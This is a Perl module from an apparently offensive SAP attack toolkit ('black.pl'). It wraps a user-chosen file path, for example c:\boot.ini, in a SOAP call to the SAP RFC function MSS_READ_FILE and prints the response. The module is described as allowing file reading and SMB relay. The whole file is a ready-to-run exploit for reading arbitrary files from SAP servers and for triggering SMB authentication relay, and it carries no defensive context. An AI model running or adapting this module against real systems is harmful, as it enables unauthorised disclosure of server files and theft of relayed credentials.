 #!/usr/bin/perl
# Module File reading (MSS_READ_FILE)

# CONFIG
######################
my $desc ="File reading + SMB Relay (MSS_READ_FILE) \n\t Usage: black.pl .. .. -m id_module <path>  \n\t A path to a file like this: c:\\boot.ini \n"; 
our $funcName="mss_read_file_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub mss_read_file_Func()
{
	
	my $path;
	my $XML='<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
     <SOAP-ENV:Header/>
     <SOAP-ENV:Body>
        <MSS_READ_FILE xmlns="urn:sap-com:document:sap:rfc:functions">
           <FILENAME>%PATH%</FILENAME>
           <FILE_DATA>
             <item>
               <LINE>2000</LINE>
             </item>
           </FILE_DATA>
        </MSS_READ_FILE>
     </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
	';
	
	
	if ($ARGV[$m_arg_i+1]){
		$path=$ARGV[$m_arg_i+1];
		print $path." - path \n\n";
	} else {
		print "Error. Please, enter path name\n";
		exit;
	}

	$XML=~s/%PATH%/$path/s;

	my @answers=send_soap($XML,1);
	
	my $answer=join('', @answers);

	print @answers;
	
	print "\n\n";
}